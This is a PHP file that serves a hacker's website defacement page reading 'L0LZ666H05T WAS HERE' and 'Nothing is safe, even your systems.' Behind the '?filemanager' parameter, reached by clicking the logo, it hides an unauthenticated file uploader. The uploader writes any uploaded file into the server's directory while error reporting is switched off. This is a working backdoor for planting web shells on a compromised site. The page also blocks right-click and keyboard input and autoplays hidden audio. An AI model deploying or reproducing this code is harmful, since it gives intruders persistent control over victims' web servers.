<?php
if (isset($_GET['filemanager'])) {
?>
<link rel="shortcut icon" href="http://simpleicon.com/wp-content/uploads/cloud-upload-2.png" type="image/x-icon" >
<TITLE>Private Uploader</TITLE>
<style type="text/css">
body {
	font-family: Arial, Helvetica, sans-serif;
}
span.uploads {
	color:lime;
	font-style: italic;
}
div.uploads {
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0, 0.4); /* Black w/opacity/see-through */
  color: white;
  font-weight: bold;
  border: 3px solid none;
  border-radius:5px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 2;
  width: 40%;
  padding: 20px;
  text-align: center;
}
.bg-image {
  background-image: url("https://cvar1984.github.io/bg-2.jpg");
  filter: blur(8px);
  -webkit-filter: blur(8px);
  height: 100%;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
a.home {
	color:blue;
	border:2px solid blue;
	padding:3px 8px;
	border-radius:3px;
	text-decoration:none;
}
svg { /* ANIMATED TEXT - START */
display: block;
font: 6em 'Century Gothic';
height: 80px;
margin: 0 auto; }

.text-copy {
fill: none;
stroke: white;
stroke-dasharray: 6% 29%;
stroke-width: 3px;
stroke-dashoffset: 0%;
animation: stroke-offset 5s infinite linear; }

.text-copy:nth-child(1){
stroke: red;
animation-delay: -1; }

.text-copy:nth-child(2){
stroke: red;
animation-delay: -2s; }

.text-copy:nth-child(3){
stroke: red;
animation-delay: -3s; }

.text-copy:nth-child(4){
stroke: red;
animation-delay: -4s; }

.text-copy:nth-child(5){
stroke: red;
animation-delay: -5s; }

@keyframes stroke-offset{
100% {stroke-dashoffset: -35%;} }
</style>
<?php
error_reporting(0);
$dir = getcwd();
$sles = '/';
$files = $_FILES['file']['name'];
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'],$dir.$sles.$_FILES['file']['name'])) { 
		    $notif = '<b><span class="uploads">'.$files.'</span></b>  Has Been Upload'; 
       } else { 
       	$notif = '<b>Upload Failed</b>'; 
       }
   }
?>
<center>
<div class="bg-image"></div>
<div class="uploads">
<svg viewBox="0 0 1400 200">
  <symbol id="s-text">
    <text text-anchor="middle" x="50%" y="50%">L0LZ666H05T WAS HERE</text>
  </symbol>
  <g class = "g-ants">
    <use xlink:href="#s-text" class="text-copy"></use>
    <use xlink:href="#s-text" class="text-copy"></use>
    <use xlink:href="#s-text" class="text-copy"></use>
    <use xlink:href="#s-text" class="text-copy"></use>
    <use xlink:href="#s-text" class="text-copy"></use>
  </g>
</svg> 
<a class="home" href="?">HOME</a>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload">
<p>
<?php echo $notif ?>
</form>
</div>
</center>
<?php
} else {
?>
<html>

<head>

<link rel="shortcut icon" href="http://i.imgur.com/hs2Zgt5.png" />

<title>ORANGUTAN1BILLION</title>

<style>

body {
font-family: Century Gothic, sans-serif;
background: #1c1c1c no-repeat center center fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
text-align: center;
cursor: url('data:image/x-icon;base64,AAACAAEAICAAAA0ABQCoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAABQAAAAkAAAALAAAADAAAAAwAAAAMAAAADAAAAAwAAAAMAAAACQAAAAcAAAADAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAwAAAAVAAAAGQAAABwAAAAeAAAAHgAAAB4AAAAeAAAAHgAAABoAAAAUAAAADAAAAAYAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATAAAAJgAAADkAAAA+AAAAQAAAAEEAAABBAAAAQQAAAEEAAABBAAAANAAAACMAAAAQAAAACQAAAAQAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAACYAAABHAAAAZgAAAGgAAABpAAAAagAAAGoAAABqAAAAagAAAGoAAABSAAAANQAAABQAAAAMAAAABQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAANQAAAGAAAACCAAAAgwAAAIMAAACDAAAAgwAAAIMAAACDAAAAgwAAAGgAAABEAAAAGwAAAA8AAAAHAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQsLC/8ICAj/AwMD/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wMDA/8AAACMAAAAdwAAAFEAAAAnAAAAEgAAAAoAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAA///////7+/v/////////////////////////////////GBgY/wAAAI4AAACDAAAAYAAAADcAAAAVAAAADQAAAAUAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAABUdHR3/+/v7//////////////////////////////////////8qKir/AAAAjgAAAIoAAABsAAAARAAAABsAAAAPAAAABwAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHBwcH////////////9fX1//////////////////////////////////z8/P8MDAz/AAAAjQAAAHcAAABRAAAAJgAAABEAAAAIAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAABUAAAD/+fn5/////////////////////////////////////////////////wEBAf8AAACOAAAAgwAAAF8AAAA1AAAAEgAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAA//39/f/9/f3/////////////////////////////////////////////////AQEB/wAAAI4AAACKAAAAaAAAAD8AAAASAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAABgJCQn//Pz8///////////////////////////////////////////////////////6+vr/IyMj/wAAAI0AAABrAAAAQgAAABIAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASBAQE//n5+f/09PT///////////////////////////////////////////////////////j4+P8nJyf/AAAAjgAAAGsAAABBAAAAEAAAAAgAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMJCQn////////////9/f3////////////////////////////////////////////9/f3//////ywsLP8AAACMAAAAaQAAAD8AAAAOAAAABgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQE//r6+v/6+vr/AAAA//////////////////////////////////////////////////39/f//////LCws/wAAAIkAAABkAAAAOAAAAAoAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDA//b29v///////////8AAAD///////r6+v/7+/v////////////////////////////y8vL///////39/f8sLCz/AAAAfAAAAFUAAAAqAAAABgAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwMD/+Tk5P/9/f3/BAQE/wYGBv/////////////////09PT/9PT0/////////////v7+/ycnJ//w8PD//////ywsLP8AAABhAAAAOAAAABYAAAADAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGBgb/BAQE/wgICP8AAAAQAQEB////////////AQEB//39/f//////CQkJ//39/f/+/v7/Gxsb/+fn5//w8PD/KSkp/wAAADwAAAAZAAAACAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAIDAwP///////////8BAQH//f39//////8JCQn//f39//7+/v8bGxv/7e3t/wwMDP8AAAAsAAAAGQAAAAcAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/z8/P//v7+/wICAv/8/Pz//////wEBAf/7+/v/5+fn/ycnJ/8AAAD/AAAAJAAAAA8AAAAHAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8EBAT/BwcH//z8/P//////BQUF/wICAv8AAAD/AAAASwAAABsAAAAPAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQH///////39/f8JCQn/AAAAjgAAAGsAAABDAAAAEgAAAAgAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAf///////f39/wkJCf8AAACMAAAAaQAAAD8AAAANAAAABgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEB///////9/f3/CQkJ/wAAAIgAAABjAAAANwAAAAkAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQH///////39/f8JCQn/AAAAeAAAAFMAAAApAAAABQAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAf///////f39/wkJCf8AAABVAAAANwAAABUAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA///////+/v7/AAAA/wAAACkAAAAYAAAABwAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw8P/wUFBf8AAAAMAAAADAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA///////////////////////4B///wAf//8AD///AA///gAP//4AB//8AAf//AAH//gAB//4AAf/8AAH/+AAD//gAA//4gAP//4AH//+AD///wD////B////wf///8H////D////w////8P////n///////////////////////8='), auto; }

svg { /* ANIMATED TEXT - START */
display: block;
font: 6em 'Century Gothic';
height: 80px;
margin: 0 auto; }

.text-copy {
fill: none;
stroke: white;
stroke-dasharray: 6% 29%;
stroke-width: 3px;
stroke-dashoffset: 0%;
animation: stroke-offset 5s infinite linear; }

.text-copy:nth-child(1){
stroke: red;
animation-delay: -1; }

.text-copy:nth-child(2){
stroke: red;
animation-delay: -2s; }

.text-copy:nth-child(3){
stroke: red;
animation-delay: -3s; }

.text-copy:nth-child(4){
stroke: red;
animation-delay: -4s; }

.text-copy:nth-child(5){
stroke: red;
animation-delay: -5s; }

@keyframes stroke-offset{
100% {stroke-dashoffset: -35%;} } /* ANIMATED TEXT - END */

img { /* LOGO UNSELECT - START */
-webkit-user-drag: none;
-khtml-user-drag: none;
-moz-user-drag: none;
-o-user-drag: none;
user-drag: none;
-webkit-user-select: none;
-khtml-user-select: none;
-moz-user-select: none;
-o-user-select: none;
user-select: none; } /* LOGO UNSELECT - END */
.shadowfilter { /* LOGO SHADOW - START */
-webkit-filter: drop-shadow(0px 0px 0px rgba(0, 0, 0, 20));
-webkit-transition: all 0.2s linear;
-o-transition: all 0.2s linear;
transition: all 0.2s linear; 
transform: scale(1.0);}
.shadowfilter:hover {
-webkit-filter: drop-shadow(0px 0px 10px rgba(0, 0, 0, 20)); 
transform: scale(1.0); } /* LOGO SHADOW - END */		
.w3-animate-top{position:relative;animation:animatetop 1s} /* ANIMATED LOGO - START*/		
@keyframes animatetop{from{top:-300px;opacity:0} to{top:0;opacity:1} } /* ANIMATED LOGO - END */
h1 { /* POP-UP MESSAGE - START */
text-align: center;
font-family: Century Gothic, sans-serif;
color: #06D85F;
margin: 80px 0; }
.box {
width: 40%;
margin: 0 auto;
background-clip: padding-box;
text-align: center; }
.button {
font-size: 0.7em;
padding: 10px;
color: red;
border: 1px solid red;
background: none;
text-decoration: none;
cursor: pointer;
transition: all 0.6s ease-out; 
border-radius: 4px; }
.button:hover {
color: blue;
border: 1px solid blue; }

.overlay {
position: absolute;
top: 0;
bottom: 0;
left: 0;
right: 0;
background: rgba(0, 0, 0, 0.8);
transition: opacity 500ms;
visibility: hidden;
opacity: 0; }

.overlay:target {
visibility: visible;
opacity: 1; }

.popup {
margin: 50px auto;
padding: 20px;
background: #FFF;
width: 30%;
position: relative;
top: 30%;
bottom: 70%;
transition: all 5s ease-in-out; 
border-radius: 7px; }

.popup h2 {
margin-top: 0;
color: #000;
font-family: Century Gothic, sans-serif; }

.popup .close {
position: absolute;
top: 20px;
right: 30px;
transition: all 200ms;
font-size: 30px;
font-weight: bold;
text-decoration: none;
color: #000; }

.popup .close:hover {
color: #999; }

.popup .content {
max-height: 30%;
overflow: auto; 
color: #000; }

@media screen and (max-width: 700px){
	
.box{
width: 70%; }

.popup{
width: 70%; } } /* POP-UP MESSAGE - END */

</style>
</head>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
<br><br><br>
<!-- ANIMATED TEXT - START -->
<svg viewBox="0 0 1400 200">
	<symbol id="s-text">
		<text text-anchor="middle" x="50%" y="50%">L0LZ666H05T WAS HERE</text>
	</symbol>
	<g class = "g-ants">
		<use xlink:href="#s-text" class="text-copy"></use>
		<use xlink:href="#s-text" class="text-copy"></use>
		<use xlink:href="#s-text" class="text-copy"></use>
		<use xlink:href="#s-text" class="text-copy"></use>
		<use xlink:href="#s-text" class="text-copy"></use>
	</g>
</svg> 
<!-- ANIMATED TEXT - END -->
<br>
<!-- LOGO - START -->
<a href="?filemanager">
<img class="shadowfilter" src="https://image.ibb.co/gDNOFS/Rebellion_Ghost.png" class="w3-animate-top" height="auto" width="300" alt="Oo"></a></p>
<!-- LOGO - END -->
<br><br>
<!-- POPUP MESSAGE - START -->
<div class="box">
<a class="button" href="#popup1">Message</a>
</div>
<div id="popup1" class="overlay">
<div class="popup">
<h2>- ORANGUTAN1BILLION -</h2>
<a class="close" href="#">&times;</a>
<div class="content">
<strong>Nothing is safe, even your systems.<br>Just enjoy the show and have a nice day.</strong><br><br>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</div>
</div>
</div>
<!-- POPUP MESSAGE - END -->
<!-- YOUTUBE - START -->
<iframe width="1" height="1" src="https://www.youtube.com/embed/KgHBliO6dZE?autoplay=1&volume=150" frameborder="0" allowfullscreen></iframe>
<!-- YOUTUBE - END -->
</body>
</html>
<?php
}